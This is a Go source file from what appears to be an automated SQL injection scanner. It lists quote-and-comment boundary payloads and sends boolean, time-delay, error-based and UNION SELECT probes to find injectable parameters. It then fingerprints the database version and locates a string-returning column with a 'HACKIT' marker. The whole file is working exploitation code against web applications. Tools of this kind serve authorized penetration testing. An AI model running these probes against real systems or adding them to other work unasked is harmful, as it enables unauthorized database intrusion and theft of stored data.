package core

import (
	"fmt"
	"strings"
	"time"
)

// BoundaryCandidate is a prefix/suffix pair that may close the original SQL
// context and comment out the remainder of the query.
type BoundaryCandidate struct {
	Prefix string
	Suffix string
}

// BoundaryCandidates returns the common contexts used by real applications.
// The order matters: string contexts are more common than numeric ones.
func BoundaryCandidates() []BoundaryCandidate {
	return []BoundaryCandidate{
		{"'", "-- -"},
		{"'", "-- "},
		{"'", "#"},
		{"'", "/*"},
		{"'", ";"},
		{"\"", "-- -"},
		{"\"", "#"},
		{"\")", "-- -"},
		{"'))", "-- -"},
		{"')", "-- -"},
		{"')", "#"},
		{"\")", "#"},
		{")", "-- -"},
		{"))", "-- -"},
		{"", "-- -"},
		{"", "#"},
		{"", ""},
	}
}

// DetectBoundary finds a working prefix/suffix pair and the first technique
// that proves the injection. It returns the boundary, the technique name and
// whether a usable boundary was found.
func (e *Engine) DetectBoundary(point InjectionPoint, baseBody string) (Boundary, string, bool) {
	candidates := BoundaryCandidates()
	forced := e.Opts.Prefix != "" || e.Opts.Suffix != ""
	if forced {
		candidates = []BoundaryCandidate{{Prefix: e.Opts.Prefix, Suffix: e.Opts.Suffix}}
	}

	techniques := []string{"boolean", "time", "error", "union"}
	switch strings.ToLower(strings.TrimSpace(e.Opts.Technique)) {
	case "", "auto":
		// Keep the default order.
	case "blind":
		techniques = []string{"boolean"}
	case "boolean", "time", "error", "union":
		techniques = []string{strings.ToLower(e.Opts.Technique)}
	case "stacked":
		// Stacked queries cannot be proven with a scalar comparison. Treat
		// the request as a union probe, which is the closest safe fallback.
		techniques = []string{"union"}
	}

	for _, technique := range techniques {
		for _, c := range candidates {
			switch technique {
			case "boolean":
				if ok, _ := e.testBoundaryBoolean(point, c, baseBody); ok {
					return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, "boolean", true
				}
			case "time":
				if e.testBoundaryTime(point, c) {
					return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, "time", true
				}
			case "error":
				if e.testBoundaryError(point, c) {
					return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, "error", true
				}
			case "union":
				if e.testBoundaryUnion(point, c, baseBody) {
					return Boundary{Prefix: c.Prefix, Suffix: c.Suffix}, "union", true
				}
			}
		}
	}

	return Boundary{}, "", false
}

func (e *Engine) testBoundaryBoolean(point InjectionPoint, c BoundaryCandidate, baseBody string) (bool, string) {
	truePayload := c.Prefix + " AND 1=1" + c.Suffix
	falsePayload := c.Prefix + " AND 1=2" + c.Suffix

	true1, _, _, err := e.RequestAt(point, truePayload)
	if err != nil {
		return false, ""
	}
	true2, _, _, err := e.RequestAt(point, truePayload)
	if err != nil {
		return false, ""
	}
	false1, _, _, err := e.RequestAt(point, falsePayload)
	if err != nil {
		return false, ""
	}
	false2, _, _, err := e.RequestAt(point, falsePayload)
	if err != nil {
		return false, ""
	}

	if !responsesSimilar(true1, true2) || !responsesSimilar(false1, false2) {
		return false, ""
	}
	if !responsesDiffer(true1, false1) {
		return false, ""
	}
	// The true response should still resemble the original page. If both
	// responses are error pages, this is not a useful boolean oracle.
	if similarity(true1, baseBody) < 0.35 && similarity(false1, baseBody) < 0.35 {
		return false, ""
	}
	return true, "boolean"
}

func (e *Engine) testBoundaryTime(point InjectionPoint, c BoundaryCandidate) bool {
	baseline := e.baselineLatency(point)
	delay := e.Opts.TimeSecs
	if delay <= 0 {
		delay = 3
	}
	for _, d := range Dialects() {
		payload := c.Prefix + " AND " + d.TimeCondition("1=1", delay) + c.Suffix
		samples := []time.Duration{}
		for i := 0; i < 2; i++ {
			_, _, _, err := e.RequestAt(point, payload)
			if err != nil {
				break
			}
			samples = append(samples, e.LastResponseTime)
		}
		if len(samples) < 2 {
			continue
		}
		if medianDuration(samples) > baseline+delayThreshold(delay) {
			return true
		}
	}
	return false
}

func (e *Engine) testBoundaryError(point InjectionPoint, c BoundaryCandidate) bool {
	for _, d := range Dialects() {
		expr, ok := d.ErrorExpr("1")
		if !ok {
			continue
		}
		payload := c.Prefix + " AND " + expr + c.Suffix
		body, _, _, err := e.RequestAt(point, payload)
		if err != nil {
			continue
		}
		if isErrorLike(body, d.Name) || strings.Contains(body, "~1~") {
			return true
		}
	}
	return false
}

func (e *Engine) testBoundaryUnion(point InjectionPoint, c BoundaryCandidate, baseBody string) bool {
	for cols := 1; cols <= 8; cols++ {
		nulls := make([]string, cols)
		for i := range nulls {
			nulls[i] = "NULL"
		}
		for _, prefix := range []string{" UNION SELECT ", " UNION ALL SELECT "} {
			payload := c.Prefix + prefix + strings.Join(nulls, ",") + c.Suffix
			body, length, _, err := e.RequestAt(point, payload)
			if err != nil {
				continue
			}
			if !isErrorLike(body, "") && length > 0 && responsesDiffer(body, baseBody) {
				return true
			}
		}
	}
	return false
}

func (e *Engine) baselineLatency(point InjectionPoint) time.Duration {
	var samples []time.Duration
	for i := 0; i < 3; i++ {
		_, _, _, err := e.RequestAt(point, "")
		if err != nil {
			continue
		}
		samples = append(samples, e.LastResponseTime)
		time.Sleep(100 * time.Millisecond)
	}
	if len(samples) == 0 {
		return 0
	}
	return medianDuration(samples)
}

func medianDuration(values []time.Duration) time.Duration {
	if len(values) == 0 {
		return 0
	}
	sorted := make([]time.Duration, len(values))
	copy(sorted, values)
	for i := 1; i < len(sorted); i++ {
		for j := i; j > 0 && sorted[j] < sorted[j-1]; j-- {
			sorted[j], sorted[j-1] = sorted[j-1], sorted[j]
		}
	}
	return sorted[len(sorted)/2]
}

// IdentifyDBMS uses version expressions from each dialect until one returns a
// plausible version string. It requires a working boundary and technique.
func (e *Engine) IdentifyDBMS(session *Session) {
	if session == nil {
		return
	}
	if d := GetDialect(session.DBMS); d != nil && session.DBMS != "" && !strings.EqualFold(session.DBMS, "Unknown") {
		return
	}

	// Column detection is dialect independent, so do it once before trying
	// each version expression. This keeps identification fast.
	if session.Columns <= 0 {
		if cols, col, ok := e.DetectUnionColumns(session); ok {
			session.Columns = cols
			session.StringCol = col
		}
	}

	for _, d := range Dialects() {
		probe := *session
		probe.DBMS = d.Name
		probe.Technique = "union"
		probeExec := NewExecutor(e, &probe)
		if probe.Columns > 0 && probe.StringCol >= 0 {
			if value, err := probeExec.unionScalar(d.Version()); err == nil && looksLikeVersion(value) {
				session.DBMS = d.Name
				session.DBMSVersion = value
				return
			}
		}
		if expr, ok := d.ErrorExpr(d.Version()); ok {
			body, _, err := probeExec.Request(" AND " + expr)
			if err == nil {
				if value := extractMarker(body); looksLikeVersion(value) {
					session.DBMS = d.Name
					session.DBMSVersion = value
					return
				}
			}
		}
	}

	// When neither UNION nor error output is available, use the confirmed
	// boolean oracle to test a dialect-specific expression. This is a
	// fingerprint, not a full extraction, so it stays cheap.
	if strings.EqualFold(session.Technique, "time") && e.identifyDBMSTime(session) {
		return
	}
	if e.identifyDBMSBlind(session) {
		return
	}
	// A target that only answers through response timing needs a timing
	// fingerprint instead of a boolean one.
	e.identifyDBMSTime(session)
}

// identifyDBMSTime finds the dialect whose delay primitive actually works. It
// is used when the target suppresses all boolean and in-band differences.
func (e *Engine) identifyDBMSTime(session *Session) bool {
	for _, d := range Dialects() {
		probe := *session
		probe.DBMS = d.Name
		probe.Technique = "time"
		exec := NewExecutor(e, &probe)
		if exec.timeOracle("1=1") {
			session.DBMS = d.Name
			return true
		}
	}
	return false
}

func (e *Engine) identifyDBMSBlind(session *Session) bool {
	for _, d := range Dialects() {
		probe := *session
		probe.DBMS = d.Name
		probe.Technique = "boolean"
		exec := NewExecutor(e, &probe)
		condition := fmt.Sprintf("%s > 0", d.Length(d.Version()))
		if exec.booleanOracle(condition) {
			session.DBMS = d.Name
			return true
		}
	}
	return false
}

func looksLikeVersion(value string) bool {
	lower := strings.ToLower(value)
	if len(value) < 3 || len(value) > 200 {
		return false
	}
	if strings.Contains(lower, "syntax") || strings.Contains(lower, "error") {
		return false
	}
	digits := 0
	for _, r := range value {
		if r >= '0' && r <= '9' {
			digits++
		}
	}
	return digits >= 2
}

// DetectUnionColumns determines the number of columns and the first
// string-compatible column. It returns (columns, stringColumn, ok).
func (e *Engine) DetectUnionColumns(session *Session) (int, int, bool) {
	if session == nil {
		return 0, 0, false
	}
	exec := NewExecutor(e, session)
	d := exec.Dialect

	columns := 0
	for n := 1; n <= 25; n++ {
		fragment := fmt.Sprintf(" ORDER BY %d", n)
		body, _, err := exec.Request(fragment)
		if err != nil {
			break
		}
		if isErrorLike(body, d.Name) {
			columns = n - 1
			break
		}
	}
	if columns <= 0 {
		for n := 1; n <= 15; n++ {
			nulls := make([]string, n)
			for i := range nulls {
				nulls[i] = "NULL"
			}
			for _, prefix := range []string{" UNION SELECT ", " UNION ALL SELECT "} {
				fragment := prefix + strings.Join(nulls, ",")
				body, _, err := exec.Request(fragment)
				if err == nil && !isErrorLike(body, d.Name) {
					columns = n
					break
				}
			}
			if columns > 0 {
				break
			}
		}
	}
	if columns <= 0 {
		return 0, 0, false
	}

	for col := 0; col < columns; col++ {
		marker := d.Marker("'HACKIT'")
		nulls := make([]string, columns)
		for i := range nulls {
			nulls[i] = "NULL"
		}
		nulls[col] = marker
		fragment := " UNION SELECT " + strings.Join(nulls, ",")
		body, _, err := exec.Request(fragment)
		if err != nil {
			continue
		}
		if strings.Contains(body, "~HACKIT~") {
			return columns, col, true
		}
	}
	return columns, -1, false
}
